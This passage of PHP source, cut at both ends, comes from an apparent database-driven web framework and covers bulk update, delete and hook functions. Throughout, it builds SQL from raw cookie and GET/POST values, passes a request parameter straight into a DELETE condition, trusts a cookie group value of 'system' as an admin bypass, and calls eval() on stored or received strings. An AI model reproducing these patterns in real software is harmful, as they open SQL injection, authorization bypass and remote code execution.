    $yz=updatingx($conn,glb(),"select count(*) as result from ".$table."  where ".qian($cdt,"=")."='".hou($cdt,"=")."' and (CRTOR='".$_COOKIE["uid"]."' or PTOF='GUEST' or  PTOF='".$_COOKIE["uid"]."' or  PTOF='".$_COOKIE["gid"]."'  or '".$_COOKIE["gid"]."'='system')","utf8");
    if ($yz>0){
     return $yz;
    }else{
     return $yz.":".$sqlx;
    };   
 }
}//DESCRIB ():  END@()
function hugedata($tb,$ks,$dts,$olk){
$xcdt="";
$tmpk=explode(",",$ks);
$totk=count($tmpk);
$tmpd=explode(";",$dts);
$totd=count($tmpd);
$idx=0;
$fmrtn="";
 for ($i=0;$i<$totk;$i++){
   if ($tempk[$i]==$olk){
    $idx=$i;
  };
 };
$succ=0;
$fail=0;
$fm="[";
 for ($j=0;$j<$totd;$j++){
   $prv=$tmpd[$j];
   $tmppv=explode(",",$prv);
   $ocdt=" ".$olk."='".$tmppv[$idx]."'";
   //echo $ocdt."__".$tmpd[$j];
   $r=upnew($tb,$ks,$tmpd[$j],$ocdt);
   if ($r==1){
    $succ=$succ+1;
   }else{
    $fail=$fail+1;
     $fm=$fm."{";
    for ($k=0;$k<$totk;$k++){
     $fm=$fm."\"".$tmpk[$k]."\":\"".$tmppv[$k]."\",";
    };
    $fm=substr($fm,0,strlen($fm)-1)."},";
   };
 };//for
  $fm=substr($fm,0,strlen($fm)-1)."]";
 return "{\"tbnm\":\"".$tb."\",\"keys\":\"".$ks."\",\"succ\":\"".$succ."\",\"fail\":\"".$fail."\",\"fdtl\":".$fm."}";
}//DESCRIB ():  END@()

function anyupnew($dodatastr,$oderb,$dtp,$kinfo=array(array())){
	$tbnm=qian($dodatastr,".");
	$tbks=qian(hou($dodatastr,"."),"[");
	$totkx=$kinfo["COLUMN"]["COUNT"];
	$tmpfmallk="";
	$tmpfmalltp="";
	//echo "totkx=".$totkx;
	
	for ($i=0;$i<$totkx;$i++){
		$tmpfmallk=$tmpfmallk.$kinfo["COLUMN"][$i].",";
		$tmpkx="";
		$tmpkx=$kinfo["COLUMN"][$i];
		
		$tmpfmalltp=$tmpfmalltp.$kinfo[$tmpkx]["COLUMN_TPNM"].",";
	}
//	echo "akk0=".$tmpfmallk;
	if ($totkx>0){
		$tmpfmallk=substr($tmpfmallk,0,strlen($tmpfmallk)-1);
		                  
		$tmpfmalltp=substr($tmpfmalltp,0,strlen($tmpfmalltp)-1);
	}
	
	if (strpos($tbks,",")>0){
		$parttbk=explode(",",$tbks);
		$totk=count($parttbk);//为了验证有几个K,和几个V,数量应该一致
	}else{
		$totk=1;
	}
	$cdtx=qian(hou($dodatastr,"["),"]");
//echo $tbnm."__".$tbks."___".$totkx."__".$cdtx;
	$backstr=fmkeyval($cdtx,$tmpfmallk,$kinfo);
	$tbvs=qian(hou($dodatastr,"val("),")");

  // echo "fmxxx=".$fmxxx;
    if ($tbvs==""){
		$fmxxx=$backstr;
		$tbnmm=$tbnm;
      $tbkiss=$tbks;
      $wtokiss=$_GET['wtokeys'];
      $tbcdtss=$fmxxx." and (CRTOR='".$_COOKIE["uid"]."' or PTOF='GUEST' or  PTOF='".$_COOKIE["uid"]."' or  PTOF='".$_COOKIE["gid"]."'  or '".$_COOKIE["gid"]."'='system')";
      $dtpp=$dtp;
      $surll=$_GET['comeurl'];
      $page=$_GET['page'];
      $pagenum=$_GET['pagenum'];
      $odcdt=$oderb;
      $showf=$_GET['sowf']; 
	 // echo $tbcdtss;
      $tbnr=anyfulltblist($showf,$fipp,$fuss,$fpss,$fbss,$tbnmm,$tbkiss,$tbcdtss,$dtpp,$surll,$odcdt);
      return $tbnr;
	}else{
	  $ptvs=explode(",",$tbvs);
	  $totv=count($ptvs);
	  if ($totk==$totv){
		  $xx=upnew($tbnm,$tbks,$tbvs,$cdtx);
		  //echo "update ".$tbnm." set ".$sqla." where ".$fmxxx;
		  if ($xx*1>0){
		    return "{\"status\":\"1\",\"totrcd\":\"0\",\"msg\":\"".String2Hex($xx)."\"}";
		  }else{
			 return "{\"status\":\"-1\",\"totrcd\":\"0\",\"msg\":\"".String2Hex($xx)."\"}";
		  }
	  }else{	
	    return "{\"status\":\"-1\",\"totrcd\":\"0\",\"msg\":\"different amount of keys and values\"}";
  	  }
	}
}//DESCRIB ():  END@()
function anyupvalue($dodatastr,$oderb,$dtp,$kinfo=array(array())){
	//=
	$tbnm=qian($dodatastr,".");
	$tbks=qian(hou($dodatastr,"."),"<");
	$totkx=$kinfo["COLUMN"]["COUNT"];
	$tmpfmallk="";
	$tmpfmalltp="";
	//echo "totkx=".$totkx;
	
	for ($i=0;$i<$totkx;$i++){
		$tmpfmallk=$tmpfmallk.$kinfo["COLUMN"][$i].",";
		$tmpkx="";
		$tmpkx=$kinfo["COLUMN"][$i];
		
		$tmpfmalltp=$tmpfmalltp.$kinfo[$tmpkx]["COLUMN_TPNM"].",";
	}
//	echo "akk0=".$tmpfmallk;
	if ($totkx>0){
		$tmpfmallk=substr($tmpfmallk,0,strlen($tmpfmallk)-1);
		                  
		$tmpfmalltp=substr($tmpfmalltp,0,strlen($tmpfmalltp)-1);
	}
	
	if (strpos($tbks,",")>0){
		$parttbk=explode(",",$tbks);
		$totk=count($parttbk);//为了验证有几个K,和几个V,数量应该一致
	}else{
		$totk=1;
	}
	$cdtx=qian(hou($dodatastr,"<"),">");
//echo $tbnm."__".$tbks."___".$totkx."__".$cdtx;
	$fmxxx="";
	
	if (strpos("xx".$cdtx,"(")>0){
		   $ptcdtx=explode("(",$cdtx);
		   $totptcdt=count($ptcdtx);
		   $tmpx="";
		   for ($i=1;$i<$totptcdt;$i++){
			 $fmtmp="";
			 $tmpx=qian($ptcdtx[$i],")");
	         $fmtmp="";
				$tmpxx=str_replace("+","*",$tmpx);
				$tmpxx=str_replace("|","*",$tmpx);
				$pttp=explode("*",$tmpxx);
				$totpp=count($pttp);
				//echo "tmpxx==".$tmpxx."----------";
				if ($totpp>1){
				  for ($k=1;$k<$totpp+1;$k++){
					$tmpxxy="";
					for ($m=0;$m<$k;$m++){
						$getmkx="";
						$tmpxxy=$tmpxxy.$pttp[$m];
						$getmkx=substr($tmpx,strlen($tmpxxy),1);
						$tmpxxy=$tmpxxy.$getmkx;
					};
					$lastmark=substr($tmpxxy,strlen($tmpxxy)-1,1);
					$backstr="";
					$backstr=fmkeyval($pttp[$k-1],$tmpfmallk,$kinfo);
					$lianjie="";
					if ($k<$totpp){
					  $lianjie=str_replace("*"," and ",$lastmark);
					  $lianjie=str_replace("+"," or ",$lianjie);
					  $lianjie=str_replace("|"," or ",$lianjie);
					  $fmtmp=$fmtmp.$backstr.$lianjie;
					}else{
					  $fmtmp=$fmtmp.$backstr;
					}                 
				  }//for			 
				   $fmxxx=$fmxxx."(".$fmtmp.")".hou($ptcdtx[$i],")");
                }else{
				   $fmxxx=$fmxxx."(".fmkeyval($tmpx,$tmpfmallk,$kinfo).")".hou($ptcdtx[$i],")");
			    }
			   
		       
		   };//for i=0

    }else{                //strpos xx () 上面是有括号的复合判断
	        if (strpos($cdtx,"*")>0 or strpos($cdtx,"+")>0 ){
	            $tmpxx=str_replace("+","*",$cdtx);
				$tmpxx=str_replace("|","*",$cdtx);
				$pttp=explode("*",$tmpxx);
				$totpp=count($pttp);
				for ($k=1;$k<$totpp+1;$k++){
					$tmpxxy="";
					for ($m=0;$m<$k;$m++){
						$getmkx="";
						$tmpxxy=$tmpxxy.$pttp[$m];
						$getmkx=substr($tmpxx,strlen($tmpxxy),1);
						$tmpxxy=$tmpxxy.$getmkx;
					};
					$lastmark=substr($tmpxxy,strlen($tmpxxy)-1,1);
					$backstr="";
					//echo $pttm[$m]."--".$tmpfmallk.";";//-----------------------------
					$backstr=fmkeyval($pttp[$k-1],$tmpfmallk,$kinfo);
					$lianjie="";
					if ($k<$totpp){
					  $lianjie=str_replace("*"," and ",$lastmark);
					  $lianjie=str_replace("+"," or ",$lianjie);
					  $lianjie=str_replace("|"," or ",$lianjie);
					  $fmtmp=$fmtmp.$backstr.$lianjie;
					}else{
					  $fmtmp=$fmtmp.$backstr;
					}
				}//for
				$fmxxx=$fmtmp;
			}else{
                    $backstr="";
					$backstr=fmkeyval($cdtx,$tmpfmallk,$kinfo);
				$fmxxx=$backstr;	
			}
	}
	$fmxxx=str_replace(")+(",") or (",$fmxxx);
	$fmxxx=str_replace(")*(",") and (",$fmxxx);
	$fmxxx=str_replace("'@_NOW'","now()",$fmxxx);
	$fmxxx=str_replace("'@_DATE'","date(now())",$fmxxx);
	$fmxxx=str_replace("'@_UID'","'".$_COOKIE["uid"]."'",$fmxxx);
	$fmxxx=str_replace("'@_GID'","'".$_COOKIE["gid"]."'",$fmxxx);
	$fmxxx=str_replace("'@_OMK'","'".onlymark()."'",$fmxxx);
	$fmxxx=str_replace("'@_TMK'","'".time()."'",$fmxxx);
	$tbvs=qian(hou($dodatastr,"val("),")");
	
	if ($tbvs==""){
		//获取信息用;可以展示出结果的;

	}else{
	   if (strpos($tbvs,",")>0){
		$parttbv=explode(",",$tbvs);
		$totv=count($parttbv);//为了验证有几个K,和几个V,数量应该一致
	   }else{
		$totv=1;
       }//更改信息用;
	}	
  // echo "fmxxx=".$fmxxx;
    if ($tbvs==""){
		$tbnmm=$tbnm;
      $tbkiss=$tbks;
      $wtokiss=$_GET['wtokeys'];
      $tbcdtss=$fmxxx." and (CRTOR='".$_COOKIE["uid"]."' or PTOF='GUEST' or  PTOF='".$_COOKIE["uid"]."' or  PTOF='".$_COOKIE["gid"]."'  or '".$_COOKIE["gid"]."'='system')";
      $dtpp=$dtp;
      $surll=$_GET['comeurl'];
      $page=$_GET['page'];
      $pagenum=$_GET['pagenum'];
      $odcdt=$oderb;
      $showf=$_GET['sowf']; 
	 // echo $tbcdtss;
      $tbnr=anyfulltblist($showf,$fipp,$fuss,$fpss,$fbss,$tbnmm,$tbkiss,$tbcdtss,$dtpp,$surll,$odcdt);
      return $tbnr;
	}else{
	  if ($totk==$totv){
		  $sqla="";
		  if ($totk>1){
		    for ($o=0;$o<$totk;$o++){
		      $sqla=$sqla.$parttbk[$o]."='".$parttbv[$o]."',";
		    }
			$sqla=substr($sqla,0,strlen($sqla)-1); 			  
		  }else{
			$sqla=$tbks."='".$tbvs."'";
		  }
		  $bb=beafaction($tbnm,"update","before");
	      $conn=mysql_connect(gl(),glu(),glp());
		  $xx=updatingx($conn,glb(),"update ".$tbnm." set ".$sqla." where ".$fmxxx." and (CRTOR='".$_COOKIE["uid"]."' or PTOF='GUEST' or  PTOF='".$_COOKIE["uid"]."' or  PTOF='".$_COOKIE["gid"]."'  or '".$_COOKIE["gid"]."'='system')","utf8");
		  $conn=mysql_connect(gl(),glu(),glp());
		  $xx=updatingx($conn,glb(),"update ".$tbnm." set createtime=now() where ".$fmxxx." and (CRTOR='".$_COOKIE["uid"]."' or PTOF='GUEST' or '".$_COOKIE["gid"]."'='system')","utf8");
		  //echo "update ".$tbnm." set ".$sqla." where ".$fmxxx;
		  $aa=beafaction($tbnm,"update","after");
		  return "{\"status\":\"1\",\"totrcd\":\"0\",\"msg\":\"".String2Hex("update ".$tbnm." set ".$sqla." where ".$fmxxx." and (CRTOR='".$_COOKIE["uid"]."' or PTOF='GUEST' or '".$_COOKIE["gid"]."'='system')")."\"}";
	  }else{	
	    return "{\"status\":\"-1\",\"totrcd\":\"0\",\"msg\":\"different amount of keys and values\"}";
  	  }
	}	
}//DESCRIB ():  END@()
function betrees($tbnmx){
  $conn=mysql_connect(gl(),glu(),glp());
  $brst=selectedx($conn,"information_schema","select INDEX_NAME,INDEX_TYPE from STATISTICS where TABLE_SCHEMA='".glb()."' and TABLE_NAME='".$tbnmx."' and INDEX_NAME<>'PRIMARY' group by INDEX_NAME","utf8","");
  $totb=countresult($brst);
  $fma="";
  for ($i=0;$i<$totb;$i++){
    $inm=anyvalue($brst,"INDEX_NAME",$i);
    $itp=anyvalue($brst,"INDEX_TYPE",$i);
    $conn=mysql_connect(gl(),glu(),glp());
    $crst=selectedx($conn,"information_schema","select INDEX_NAME,COLUMN_NAME,INDEX_TYPE from STATISTICS where TABLE_SCHEMA='".glb()."' and TABLE_NAME='".$tbnmx."' and INDEX_NAME='".$inm."' order by SEQ_IN_INDEX","utf8","");  
    $totc=countresult($crst);
    $fmd="";
    for ($j=0;$j<$totc;$j++){
      $fmd=$fmd.anyvalue($crst,"COLUMN_NAME",$j).",";
    }
    $fmd="UNIQUE KEY ".$inm." (".killlaststr($fmd).") USING ".$itp;
    $fma=$fma.$fmd.",";
  }
  if ($totb>0){
    $fma=killlaststr($fma);
  }else{
    $fma="";
  }  
  return $fma; 
}//DESCRIB ():  END@()
function tabsrc($fbs,$tbnmx,$tbttx){  
  if ($fbs==""){
    $fbs=glb();
  }
  if ($tbnmx!=""  and $tbnmx!="undefined"){
   $tbcrt=UX("select createsql as result from coode_tablist where TABLE_NAME='".$tbnmx."' and schm='".$fbs."'");
   $sametsrc=UX("update coode_pagefuntab set sdata='".$tbcrt."' where sourcecls='tab' and sourceid='".$tbnmx."'");
   $xn=UX("insert into coode_tabsrc(srctype,srcmark,srctitle,tablename,srctext,STCODE,VRT,RIP,schm,CRTM,UPTM,CRTOR,OLMK)values('crtsql','".$tbnmx."crt','".$tbttx."创建代码','".$tbnmx."','".$tbcrt."','','','".getip()."','".$fbs."',now(),now(),'".$_COOKIE["uid"]."','".onlymark()."')");
    $zz=UX("update coode_tabsrc set srctext='".$tbcrt."' where srctype='crtsql' and srcmark='".$tbnmx."crt'");
  $strst=SX("select shortid,shorttitle,showkeys from coode_shortdata where tablename='".$tbnmx."'");
  $totst=countresult($strst);
  for ($i=0;$i<$totst;$i++){
    $xm=UX("insert into coode_tabsrc(srctype,srcmark,srctitle,tablename,srctext,STCODE,VRT,RIP,schm,CRTM,UPTM,CRTOR,OLMK)values('short','".anyvalue($strst,"shortid",$i)."','".anyvalue($strst,"shorttitle",$i)."表单','".$tbnmx."','".anyvalue($strst,"showkeys",$i)."','','','".getip()."','".$fbs."',now(),now(),'".$_COOKIE["uid"]."','".onlymark()."')");   
    $xn=UX("insert into coode_tabsrc(srctype,srcmark,srctitle,tablename,srctext,STCODE,VRT,RIP,schm,CRTM,UPTM,CRTOR,OLMK)values('subtable','".anyvalue($strst,"shortid",$i)."','".anyvalue($strst,"shorttitle",$i)."表单副表','".$tbnmx."','".anyvalue($strst,"showkeys",$i)."','','','".getip()."','".$fbs."',now(),now(),'".$_COOKIE["uid"]."','".onlymark()."')");
  }
    //要 bak的数据  还有函数名称 响应函数，应该有很多资源
    return true;
  }else{
    return false;
  }
}//DESCRIB ():  END@()

//做一个 PHP MYSQL js 超级时间增减反馈 一次性解决时间问题.@_NOW+1d,@_DATE+1d,@_DATE-1h;
function beafaction($tbnm,$act,$sx){
	//表变动一律用 表中参数,有时候传递不过来,然后用表的值计算 需要单条目验证的不可以 大量修改,可以下批量的
	//单条目改变的方法;     多条目改变的方法;群计算 比如,新增了一个收入值得;那么该条目组的累加要反映到 订单表上. 首先确定哪些发生改变而没 后续没行动则行动
    $ext=1;
	if ($tbnm!="" && $act!="" && $sx!=""){
     $conn=mysql_connect(gl(),glu(),glp());
	 if ($act=="insert" && $sx=="before"){
	  $bfist=updatingx($conn,glb(),"select bfist as result from coode_keydetailx where TABLE_NAME='".$tbnm."' and COLUMN_NAME='SNO'","utf8");
	  $ftxt=$bfist;
	 }

	 if ($act=="update" && $sx=="before"){
	  $bfupd=updatingx($conn,glb(),"select bfupd as result from coode_keydetailx where TABLE_NAME='".$tbnm."' and COLUMN_NAME='SNO'","utf8");
	  $ftxt=$bfupd;
	 }
	 if ($act=="insert" && $sx=="after"){
	  $aftist=updatingx($conn,glb(),"select aftist as result from coode_keydetailx where TABLE_NAME='".$tbnm."' and COLUMN_NAME='SNO'","utf8");
	  $ftxt=$aftist;
	 }
	 if ($act=="update" && $sx=="after"){
	  $aftupd=updatingx($conn,glb(),"select aftupd as result from coode_keydetailx where TABLE_NAME='".$tbnm."' and COLUMN_NAME='SNO'","utf8");
	  $ftxt=$aftupd;
	 }
     $upf="";     
		if (strlen($ftxt)>10){
		  $zh=Hex2String(hou($ftxt,"TYPE_HEX:"));
          $zh=str_replace("-r-n","\r\n",str_replace("\\"."'","'",$zh));
           if (strlen($zh)>10){
             eval($zh);
           };
		}else{
		  $ext= "-1:".$ftxt;	
		}		
	  
	 }else{
		 $ext="-1:".$tbnm."-".$act."-".$sx;
	 }
  return $ext;
}//DESCRIB ():  END@()


function anyrcv($tbnm,$kies,$sno,$dttp){
if (strpos('--'.$kies,'-killitem')>0){
     $ext=1; 
     $dxt=0;
     $conn=mysql_connect(gl(),glu(),glp());
     $gphpc=updatingx($conn,glb(),"select bfdel as result from coode_keydetailx where TABLE_NAME='".$tbnm."' and COLUMN_NAME='SNO'","utf8");
   if ($gphpc!=""){ 
     $gphpc=tostring($gphpc);
      $x=eval($gphpc);
   };
    if ($ext==1){      
      $kei=hou($kies,"-killitem:");
      if ($kei!="-killitem" and $kei!="" and $sno!=""){
          $conn=mysql_connect(gl(),glu(),glp());     
          $x=updatingx($conn,glb(),"delete from ".$tbnm." where ',".$sno.",' like concat('%','".$kei."',',%') and PTOF not like '%default%'","utf8");
      }else{
         if ($kei=="-killitem" and $sno!="" and $_GET["killcdt"]==""){
           $conn=mysql_connect(gl(),glu(),glp());     
           $x=updatingx($conn,glb(),"delete from ".$tbnm." where ',".$sno.",' like concat('%,',SNO,',%')  and PTOF not like '%default%'","utf8");                                    
           $dxt=1;
         }else{
           if ($_GET["killcdt"]!=""){
             $conn=mysql_connect(gl(),glu(),glp());        
             $x=updatingx($conn,glb(),"delete from ".$tbnm." where  ".$_GET["killcdt"],"utf8");           
             $dxt=1;
           }else{
             $dxt=0;
           }
         };
      };
    };
  $conn=mysql_connect(gl(),glu(),glp());     
     $bdx=updatingx($conn,glb(),"update coode_shortaffect set UPTM=now() where tablename='".$tbnm."' ","utf8"); //全更新，因为排序会变
     $gphpc="";
     $conn=mysql_connect(gl(),glu(),glp());
     $gphpc=updatingx($conn,glb(),"select aftdel as result from coode_keydetailx where TABLE_NAME='".$tbnm."' and COLUMN_NAME='SNO'","utf8");             
     if ($gphpc!=""){ 
        $gphpc=tostring($gphpc);
        $x=eval($gphpc);
     };
    if ($dttp=="json"){
       return "{\"status\":\"".$dxt."\"}";
    }else{
       return $dxt;
    };//zuihou return
}else{ 
 $x=tbupdt($sno,$tbnm,$kies);
 switch ($dttp){
   case "json":  
   return "{\"status\":1,\"SNO\":\"".$x."\"}"; 
   break;
   case "txt":  
   return $x;  
   break;
   default:
   return $x;  
  }//switch  
 }
}//DESCRIB ():  END@()
function makeask($gsno,$gtnm,$gkies,$sqls,$stt){  
  if (1>0){
    $sqlx="tablename,affectkeys,affectsno,tww,sqltime,sqlcls,execsql,uid,gid,cid,appid,impactstt,askimpact,exectime,OLMK,CRTM,UPTM,RIP,STCODE";
    $tww="";
    if (strpos($sqls,"where")>0 or strpos($sqls,"WHERE")>0){
      $tww=hou(hou($sqls,"where"),"WHERE");
    };
    $scls="";
    if (strpos("x".$sqls,"insert")>0 or strpos("x".$sqls,"INSERT")>0){
      $scls="new";
    };
    if (strpos("x".$sqls,"update")>0 or strpos("x".$sqls,"UPDATE")>0){
      $scls="update";
    };
    if (strpos("x".$sqls,"delete")>0 or strpos("x".$sqls,"DELETE")>0){
      $scls="delete";
    };
     $sqly="'".$gtnm."','".$gkies."','".$gsno."','dTYPE_HEX:".String2Hex($tww)."',now(),'".$scls."','dTYPE_HEX:".String2Hex($sqls)."','".$_COOKIE["uid"]."','".$_COOKIE["gid"]."','".$_COOKIE["cid"]."','"._get("appid")."','".$stt."','',now(),'".onlymark()."',now(),now(),'".getip()."','".$_SERVER['HTTP_REFERER']."'";
      if ($gtnm!="coode_sqlimpact"){
       $conn=mysql_connect(gl(),glu(),glp());
       $nx=updatingx($conn,glb(),"insert into coode_sqlimpact(".$sqlx.")values(".$sqly.")","utf8");      
       $conn=mysql_connect(gl(),glu(),glp());    
       $bdx=updatingx($conn,glb(),"update coode_shortaffect set UPTM=now() where tablename='".$gtnm."' ","utf8");    
       $conn=mysql_connect(gl(),glu(),glp());    
       $bdx=updatingx($conn,glb(),"update coode_shortaffect set UPTM=now() where tablename='coode_sqlimpact' ","utf8");    
       return true;
      }else{
        return false;
      }
      
  }else{
      return false;
  }
}//DESCRIB ():  END@()
function tbupdt($gtsno,$gttnm,$gtkies){
 if (massvfpost($gttnm,$gtkies,$gtsno)==1 or haspmtoftab($gttnm,$_COOKIE["uid"],$_COOKIE["cid"])=="-1"){//如果GTKIES为空的话,直接弄到报错
  //echo "gtsno=".$gtsno."__gttnm=".$gttnm."__kies=".$gtkies."-----------------demoeval=".$_POST["p_demoeval".$gtsno];
   $mksql=fmpost($mksql,$gtsno,$gttnm,$gtkies);   
   $y=makeask($gtsno,$gttnm,$gtkies,$mksql["COLUMN"]["sqlstr"],"-1");   
  if ($y==true){
    $ext=1; //如果执行语句里有EXT改变结果,可以根据此判断是否执行
   for ($rn=0;$rn<$mksql["TABLE"]["totrcv"];$rn++){
    $tmprk=$mksql["RECEIVE"][$rn];
    $tmptba=$mksql["TABLE"]["sqlaction"];
    //不能简简单单用eXT1 因为有好多字段
    $gphpc="";
    if ($mksql[$tmprk]["bf".$tmptba].$mksql[$tmprk]["obf".$tmptba]!=""){//字段变动钱          
        if ($mksql[$tmprk]["obf".$tmptba]!=""){
          $gphpc=$mksql[$tmprk]["obf".$tmptba];        
        }else{
          $gphpc=$mksql[$tmprk]["bf".$tmptba];
        }
       if ($gphpc!=""){
           $gphpc=tostring($gphpc);     
           $x=eval($gphpc);
       };//if
    };//if  
  };//for
// $gphpc="";
//  echo "tablechange-----------".$mksql["TABLE"]["bf".$tmptba];
    if ($mksql["TABLE"]["bf".$tmptba].$mksql["TABLE"]["obf".$tmptba]!=""){//表变动钱              
       if ($mksql["TABLE"]["obf".$tmptba]!=""){
         $gphpc=$mksql["TABLE"]["obf".$tmptba];
       }else{
         $gphpc=$mksql["TABLE"]["bf".$tmptba];
       }
       if ($gphpc!=""){           
           $gphpc=tostring($gphpc);           
           $x=eval($gphpc);
       };//if
    };//if
  }//$y==makeask   
  // echo "wait to send:".$mksql["COLUMN"]["sqlstr"]."_".$gtkies."__".$gtsno;                                   //从头开始履历;先查询表字段的变化再最后表的变化
  if ($ext==1 and $y==true){    
    $mksql=fmpost($mksql,$gtsno,$gttnm,$gtkies,1);   
    if ($y==true){//过问执行      
      $y=makeask($gtsno,$gttnm,$gtkies,$mksql["COLUMN"]["sqlstr"],"1");  
      $conn=mysql_connect(gl(),glu(),glp());
      $x=updatingx($conn,glb(),$mksql["COLUMN"]["sqlstr"],"utf8");//变动前后分界线;如果前置函数有一个出错,或者有异议,就不改动操作;前提是这个错误是影响这个改动的,如果无关则不用累乘判断-------------------------------------------------------------------------------------
    }else{
      $y=makeask($gtsno,$gttnm,$gtkies,$mksql["COLUMN"]["sqlstr"],"0");  
      $ext=9;
    }
     if ($_GET["vstr"]!=""){
       $gipx=qian($_SERVER['HTTP_REFERER'],"//").qian(hou($_SERVER['HTTP_REFERER'],"//"),"/");
     }else{
       $gipx=qian($_SERVER['HTTP_REFERER'],"//").qian(hou($_SERVER['HTTP_REFERER'],"//"),"/");
     }
     $conn=mysql_connect(gl(),glu(),glp());    
     if ($gttnm!="coode_plotmydetail" and $gttnm!="coode_plotdetail"){
       $nc=updatingx($conn,glb(),"update ".$gttnm." set UPTM=now(),CRTM=now(),GIP='".$gipx."',CRTOR='".$_COOKIE["uid"]."' where OLMK='".$_POST["p_OLMK0"]."'","utf8");    
     }     
     if ($gttnm!="coode_plotmydetail" and $gttnm!="coode_plotdetail"){
       $conn=mysql_connect(gl(),glu(),glp());    
       $nc=updatingx($conn,glb(),"update ".$gttnm." set PTOF='".myfirstpos()."' where PTOF='' and OLMK='".$_POST["p_OLMK0"]."'","utf8");    
       $conn=mysql_connect(gl(),glu(),glp());    
       $bd=updatingx($conn,glb(),"update ".$gttnm." set UPTM=now() where SNO='".$gtsno."' or OLMK='".$gtsno."'","utf8");    
     }
     $conn=mysql_connect(gl(),glu(),glp());    
     $rpr=updatingx($conn,glb(),"update ".$gttnm." set UPTM='1987-11-23 18:18:18' where UPTM='0000-00-00 00:00:00'","utf8");    
     $conn=mysql_connect(gl(),glu(),glp());    
     $rpr=updatingx($conn,glb(),"update ".$gttnm." set CRTM='1987-11-23 18:18:18' where CRTM='0000-00-00 00:00:00'","utf8");    
     $conn=mysql_connect(gl(),glu(),glp());    
     $rpr=updatingx($conn,glb(),"update ".$gttnm." set OLMK=RAND()*1000000000 where OLMK=''","utf8");    
     if (($gtsno*1)==0){
       $gtsno="0";
       $conn=mysql_connect(gl(),glu(),glp());    
       $bdx=updatingx($conn,glb(),"update coode_shortaffect set UPTM=now() where tablename='".$gttnm."' ","utf8");    
     }else{       
       $conn=mysql_connect(gl(),glu(),glp());    //不进一步判断了，有变动都更新一下，因为有可能跨字段描述的也可能需要重新渲染
       $bdx=updatingx($conn,glb(),"update coode_shortaffect set UPTM=now() where tablename='".$gttnm."' ","utf8");    
     };     //
  $mkx=UX("select keynames as result from coode_tablist  where TABLE_NAME='".$gttnm."' and schm='".glb()."'");
  if (substr($mkx,0,5)=="OLMK,"){
    $woutolmk=hou($mkx,"OLMK,");
  }else{
    $woutolmk=str_replace(",OLMK","",$mkx);
  }
    if ($woutolmk!=""){
      $zx=UX("update ".$gttnm." set OLMK=md5(concat(".$woutolmk."))");
    }    
   for ($rn=0;$rn<$mksql["TABLE"]["totrcv"];$rn++){
    $tmprk=$mksql["RECEIVE"][$rn];
    $tmptba=$mksql["TABLE"]["sqlaction"]; 
    if ($mksql[$tmprk]["aft".$tmptba].$mksql[$tmprk]["oaft".$tmptba]!=""){       
       if ($mksql[$tmprk]["oaft".$tmptba]!=""){
         $gphpc=$mksql[$tmprk]["oaft".$tmptba]; 
       }else{
         $gphpc=$mksql[$tmprk]["aft".$tmptba]; 
       }             
       if ($gphpc!=""){           
           $gphpc=tostring($gphpc);           
           $x=eval($gphpc);
       };//if    
    };//if
   };//for
     $gphpc="";
     if ($mksql["TABLE"]["aft".$tmptba].$mksql["TABLE"]["oaft".$tmptba]!=""){
        if ($mksql["TABLE"]["oaft".$tmptba]!=""){
          $gphpc=$mksql["TABLE"]["oaft".$tmptba];
        }else{
          $gphpc=$mksql["TABLE"]["aft".$tmptba];
        }
        if ($gphpc!=""){           
           $gphpc=tostring($gphpc);           
           $x=eval($gphpc);
         };//if
     };//if  
    if ($_GET["tmpolmk"]!=""){
      $nsno=intval(UX("select SNO as result from ".$gttnm."  where OLMK='".$_GET["tmpolmk"]."'"));          
    }
    if ($nsno=="" or intval($nsno)==0 ){
      return "1";            
    }else{
      if ($gtsno!=""){
        return $gtsno;
      }else{
        return $nsno;
      }
    }
    
  }else{;//ext=1 如果前面不可以后面也不可以        
    return "0";   
  };//ext=1 如果前面不可以后面也不可以
 }else{
  return "0";
 };   
}//DESCRIB ():  END@()
//-----------------------------------------------------connect的应该地方先放前面试试
function hugeoperate($tbnm,$tbkeys,$olk,$rcvdts){
   //对每行都SPLIT	看看每行是不是都一致
 $kif=allkeyinfo($kif,glb(),$tbnm); 
//echo  "tot=".$kif["COLUMN"]["COUNT"];
 if ($kif["COLUMN"]["COUNT"]>0){
// echo  "存在表,再判断,上传的字段是否都存在";
    //  1.都存在  就直接生成上传代码
  $news=addnewkey(glb(),$tbnm,gmk(),gmt()); //把必须有的也加上;
  //echo "xxxxxxxxx";
  $nexx=str_replace(';',',',$rcvdts);
  $ptkey=explode(",",$tbkeys);
  $totpt=count($ptkey);
 // echo "totpt=".$totpt;
  $fxtp=$totpt;
  $nexx=str_replace(',','\');$m=ftype($m,\''.$fxtp.'\',\'',$nexx);
  $m["test"]["m"]=0;
  $m["test"]["t"]=0;
  $m["test"]["v"]=1;
  $m["test"]["s"]=0;
  $nexx='ftype($m,\''.$fxtp.'\',\''.substr($nexx,0,strlen($nexx)-strlen($fxtp.'$m=ftype($m,\')' )-4).');';
  $nexx='$m='.$nexx;
  eval($nexx);

  $m=jianding($m,$fxtp);
 // echo "s=".$m["test"]["s"];
  $fxtp=$m["test"]["fmktp"];
  $pttypes=explode("/",$fxtp);
    for ($mmm=0;$mmm<$totpt;$mmm++){
      //ptkey的顺序就是获取FXTP的顺序
     if(strpos(",,".$kif["COLUMN"]["ALLKEY"].",",$ptkey[$mmm])>0){
        //echo "存在该字段";
     }else{
        //echo  $kif["COLUMN"]["ALLKEY"]."不存在该字段".$ptkey[$mmm];
      $conn=mysql_connect(gl(),glu(),glp());
      $exttb=updatingx($conn,glb(),"alter table ".$tbnm." add ".$ptkey[$mmm]." ".$pttypes[$mmm],"utf8"); 
      $adds=$adds+1;
     };
   };
  //都判断和添加完之后重新获取KEYTYPE

  $newtpinfo=thekeyinfo($newtpinfo,glb(),$tbnm,$tbkeys);
 $fmktps="";
  if ($newtpinfo["COLUMN"]["COUNT"]==$totpt){
   for ($mmm=0;$mmm<$totpt;$mmm++){
    $fmktps=$fmktps.$newtpinfo[$ptkey[$mmm]]["COLUMN_TYPE"]."/";
   };
  $fmktps=substr($fmktps,0,strlen($fmktps)-1);
  $nexx=str_replace(';',',',$rcvdts);
  $ptkey=explode(",",$tbkeys);
  $totpt=count($ptkey);
  $fxtp=$totpt;
  $nexx=str_replace(',','\');$m=ftype($m,\''.$fxtp.'\',\'',$nexx);
  $m["test"]["m"]=0;
  $m["test"]["t"]=0;
  $m["test"]["v"]=1;
  $m["test"]["s"]=0;
